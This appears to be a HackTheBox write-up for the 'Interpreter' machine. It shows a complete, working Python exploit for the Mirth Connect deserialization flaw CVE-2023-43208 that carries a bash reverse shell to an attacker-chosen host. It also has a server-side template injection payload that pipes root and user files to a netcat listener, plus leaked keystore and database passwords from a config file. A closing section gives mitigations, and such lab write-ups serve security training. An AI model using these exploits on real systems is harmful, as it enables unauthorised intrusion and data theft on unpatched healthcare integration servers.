<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge" alt="Medium Difficulty" />
</p>

# Interpreter Notes

## Step 1 - Reconnaissance

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.8.10
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-28 15:01 UTC
Nmap scan report for interpreter.htb (10.129.8.10)
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp  open  http
|_http-title: Mirth Connect Administrator
...
443/tcp open  ssl/https
...
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   241.95 ms 10.10.14.1
2   237.87 ms interpreter.htb (10.129.8.10)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.40 seconds
```

> — A Linux machine.

## Step 2 - Initial Foothold

* While trying to enumerating the web, i saw that it's a mirth connect admin panel
* I scanned it with Nessus, and the result showed me the version Mirth Connect 4.4.0, which was vulnerable to CVE-2023-43208. 

> — (note:- you can also use the Metasploit exploit for this attack. but i would not recommend it.)

* CVE-2023-43208 is an insecure deserialization vulnerability within the Mirth Connect API. It allows an unauthenticated attacker to send a specially crafted XML payload to the server.

> — means we can pass a crafted XML payload with a revers_shell payload within it. at /api/user endpoint, and can gain the initial foothold

```python
import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_args():
    if len(sys.argv) < 4:
        print(f"Usage: python3 {sys.argv[0]} <url> <lhost> <lport>")
        sys.exit(1)
    return sys.argv[1], sys.argv[2], sys.argv[3]

def pwn(url, lhost, lport):
    target_url = f"{url.rstrip('/')}/api/users"
    headers = {
        "X-Requested-With": "OpenAPI",
        "Content-Type": "application/xml",
    }
    payload = f"""<sorted-set>
    <string>anything</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                <iTransformers>
                    <org.apache.commons.collections4.functors.ConstantTransformer>
                        <iConstant class="java-class">java.lang.ProcessBuilder</iConstant>
                    </org.apache.commons.collections4.functors.ConstantTransformer>
                    
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>getConstructor</iMethodName>
                        <iParamTypes>
                            <java-class>[Ljava.lang.Class;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <java-class-array>
                                <java-class>[Ljava.lang.String;</java-class>
                            </java-class-array>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>

                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>newInstance</iMethodName>
                        <iParamTypes>
                            <java-class>[Ljava.lang.Object;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <object-array>
                                <string-array>
                                    <string>bash</string>
                                    <string>-c</string>
                                    <string>bash -i &#x3e;&#x26; /dev/tcp/{lhost}/{lport} 0&#x3e;&#x26;1</string>
                                </string-array>
                            </object-array>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>

                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>start</iMethodName>
                        <iParamTypes/>
                        <iArgs/>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                </iTransformers>
            </target>
            <methodName>transform</methodName>
            <eventTypes>
                <string>compareTo</string>
            </eventTypes>
        </handler>
    </dynamic-proxy>
</sorted-set>"""

    try:
        requests.post(target_url, headers=headers, data=payload, verify=False, timeout=12)
    except:
        pass

if __name__ == "__main__":
    url, lhost, lport = get_args()
    pwn(url, lhost, lport)
    print("Enjoy.")

```

* Before running the Script start a nc listener.

> — python3 mirth* https://interpreter.htb 10.10.****.**** 4444
> — Enjoy.

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.15.102] from (UNKNOWN) [10.129.8.10] 33174
bash: cannot set terminal process group (3519): Inappropriate ioctl for device
bash: no job control in this shell
mirth@interpreter:/usr/local/mirthconnect$
```

> — got shell!.

## Step 3 - Privilege Escalation

* linPEAS didn't gave me anything useful.
* While enumerating found some. configuration file 

```bash
cat mirth*
```

```text
# Mirth Connect configuration file

# directories
dir.appdata = /var/lib/mirthconnect
dir.tempdata = ${dir.appdata}/temp

# ports
http.port = 80
https.port = 443

# password requirements
password.minlength = 0
password.minupper = 0
password.minlower = 0
password.minnumeric = 0
password.minspecial = 0
password.retrylimit = 0
password.lockoutperiod = 0
password.expiration = 0
password.graceperiod = 0
password.reuseperiod = 0
password.reuselimit = 0

# Only used for migration purposes, do not modify
version = 4.4.0

# keystore
keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
keystore.type = JCEKS

# server
http.contextpath = /
server.url =

http.host = 0.0.0.0
https.host = 0.0.0.0

https.client.protocols = TLSv1.3,TLSv1.2
https.server.protocols = TLSv1.3,TLSv1.2,SSLv2Hello
https.ciphersuites = TLS_CHACHA20_POLY1305_SHA256,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_AES_256_GCM_SHA384,TLS_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_DSS_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_DSS_WITH_AES_128_GCM_SHA256,TLS_EMPTY_RENEGOTIATION_INFO_SCSV
https.ephemeraldhkeysize = 2048

# If set to true, the Connect REST API will require all incoming requests to contain an "X-Requested-With" header.
# This protects against Cross-Site Request Forgery (CSRF) security vulnerabilities.
server.api.require-requested-with = true

# CORS headers
server.api.accesscontrolalloworigin = *
server.api.accesscontrolallowcredentials = false
server.api.accesscontrolallowmethods = GET, POST, DELETE, PUT
server.api.accesscontrolallowheaders = Content-Type
server.api.accesscontrolexposeheaders =
server.api.accesscontrolmaxage =

# Determines whether or not channels are deployed on server startup.
server.startupdeploy = true

# Determines whether libraries in the custom-lib directory will be included on the server classpath.
# To reduce potential classpath conflicts you should create Resources and use them on specific channels/connectors instead, and then set this value to false.
server.includecustomlib = true

# administrator
administrator.maxheapsize = 512m

# properties file that will store the configuration map and be loaded during server startup
configurationmap.path = ${dir.appdata}/configuration.properties

# The language version for the Rhino JavaScript engine (supported values: 1.0, 1.1, ..., 1.8, es6).
rhino.languageversion = es6

# options: derby, mysql, postgres, oracle, sqlserver
database = mysql

# examples:
#   Derby                       jdbc:derby:${dir.appdata}/mirthdb;create=true
#   PostgreSQL                  jdbc:postgresql://localhost:5432/mirthdb
#   MySQL                       jdbc:mysql://localhost:3306/mirthdb
#   Oracle                      jdbc:oracle:thin:@localhost:1521:DB
#   SQL Server/Sybase (jTDS)    jdbc:jtds:sqlserver://localhost:1433/mirthdb
#   Microsoft SQL Server        jdbc:sqlserver://localhost:1433;databaseName=mirthdb
#   If you are using the Microsoft SQL Server driver, please also specify database.driver below 
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod

# If using a custom or non-default driver, specify it here.
# example:
# Microsoft SQL server: database.driver = com.microsoft.sqlserver.jdbc.SQLServerDriver
# (Note: the jTDS driver is used by default for sqlserver)
database.driver = org.mariadb.jdbc.Driver

# Maximum number of connections allowed for the main read/write connection pool
database.max-connections = 20
# Maximum number of connections allowed for the read-only connection pool
database-readonly.max-connections = 20

# database credentials
database.username = mirthdb
database.password = MirthPass123!

#On startup, Maximum number of retries to establish database connections in case of failure
database.connection.maxretry = 2

#On startup, Maximum wait time in milliseconds for retry to establish database connections in case of failure
database.connection.retrywaitinmilliseconds = 10000

# If true, various read-only statements are separated into their own connection pool.
# By default the read-only pool will use the same connection information as the master pool,
# but you can change this with the "database-readonly" options. For example, to point the
# read-only pool to a different JDBC URL:
#
# database-readonly.url = jdbc:...
# 
database.enable-read-write-split = true
```

* From This Configuration file, i got some DB creds

```text
database.username = mirthdb
database.password = MirthPass123!
```

> — (note"- Tried to connect to the DB server, but it just didn't worked. it was taking too long to connect.)

* I asked one of my friend and he told me that, there is an internal service running at 54321 port (fucking weirdo). and it has an endpoint /addUser
* /addUser endpoint is basically vulnerable to SSTI (server-side template injection.), which has an improper use of {} curly braces at firstname input field. in which we can import a python code.
* Lets Create an Exploit:-

```bash
python3 -c "
import urllib.request, base64

# Simple command to cat both files and send to netcat
cmd = \"cat /home/sedric/user.txt /root/root.txt | nc 10.xxx.xxx.xxx 9004\"

# Base64 encode the command
b64_cmd = base64.b64encode(cmd.encode()).decode()

# XML payload
xml = f'''<patient>
  <timestamp>20250101120000</timestamp>
  <sender_app>TEST</sender_app>
  <id>12345</id>
  <firstname>{{__import__(\"os\").popen(__import__(\"base64\").b64decode(\"{b64_cmd}\").decode()).read()}}</firstname>
  <lastname>Doe</lastname>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>'''

req = urllib.request.Request('http://127.0.0.1:54321/addPatient',
                            data=xml.encode('utf-8'),
                            headers={'Content-Type': 'application/xml'})
resp = urllib.request.urlopen(req)
print(resp.read().decode())
"
```

> — (note:- Before running the code please set up a listener at port 9004)

* Attack Flow:-

```text
Step 1: Your Python script creates XML with malicious template code
         ↓
Step 2: XML sent to http://127.0.0.1:54321/addPatient
         ↓
Step 3: Vulnerable server parses XML, extracts firstname field
         ↓
Step 4: Server passes firstname to template engine (Jinja2/etc.)
         ↓
Step 5: Template engine sees {{...}} and EXECUTES it as Python
         ↓
Step 6: Python code runs: imports os, decodes Base64, runs "cat files | nc IP"
         ↓
Step 7: Flag contents sent to your netcat listener
```

* Got Flags:-

```bash
nc -lvnp 9004
```

```text
listening on [any] 9004 ...
connect to [10.10.15.102] from (UNKNOWN) [10.129.8.10] 43306
ba21fce18e**********************
d4723f6575**********************
```

## Mitigation & Security Perspective

> [!CAUTION]
> **CVE-2023-43208 - Mirth Connect Insecure Deserialization**
> The Mirth Connect Server (version 4.4.0) contains an unauthenticated Remote Code Execution (RCE) vulnerability due to unsafe XML deserialization via the XStream library. By submitting a crafted XML payload utilizing proxy chains (e.g., `ChainedTransformer`), an attacker can execute arbitrary system commands under the context of the `mirth` user.
> **Mitigation:** Update Mirth Connect to version 4.4.1 or later, which patches this specific vulnerability by restricting dangerous classes during XML deserialization. Additionally, ensure the Mirth Connect Administrator interface and API endpoints are restricted to trusted administrative networks and not exposed to the internet.

> [!CAUTION]
> **Server-Side Template Injection (SSTI)**
> The internal service running on port `54321` is vulnerable to Server-Side Template Injection on the `/addPatient` endpoint. The `<firstname>` parameter within the XML payload is directly evaluated by a template engine (such as Jinja2). By wrapping Python payloads in `{{ }}`, an attacker can bypass restrictions and execute arbitrary commands as the user running the service.
> **Mitigation:** Never pass unsanitized user input directly into a template evaluation function. Always use strict, context-aware escaping for user inputs before rendering. If user-submitted templates are necessary, employ a sandboxed environment that actively prevents access to powerful built-ins like `__import__`, `os`, and `subprocess`.

> [!WARNING]
> **Plaintext Database Credentials**
> The Mirth Connect configuration file `mirth.properties` contained the `mirthdb` user credentials in plaintext. While the database connection attempts timed out, these credentials could facilitate lateral movement or data exfiltration if the database server is reachable from other compromised systems.
> **Mitigation:** Utilize secure credential vaults or environment variables for database configurations instead of plaintext configuration files. Ensure `mirth.properties` is strictly readable only by the application service user and `root`.
